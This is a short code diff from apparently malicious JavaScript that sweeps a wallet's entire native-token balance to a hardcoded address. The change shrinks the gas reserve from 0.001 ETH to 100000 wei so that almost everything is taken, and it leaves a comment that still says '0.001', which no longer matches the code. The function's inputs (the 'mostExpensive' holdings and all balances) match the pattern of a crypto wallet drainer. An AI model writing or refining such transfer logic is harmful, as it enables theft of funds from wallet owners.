@@ -487,7 +487,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   const nativeToken = networkTokens.find(t => t.address === 'native')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasReserve = BigInt('1000000000000000') // 0.001 in wei
+    const gasReserve = BigInt('100000') // 0.001 in wei
     if (balanceWei > gasReserve) {
       const transferAmount = balanceWei - gasReserve
       console.log(`Preparing native token transfer: ${nativeToken.symbol} amount=${formatUnits(transferAmount, 18)} to=0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0`)
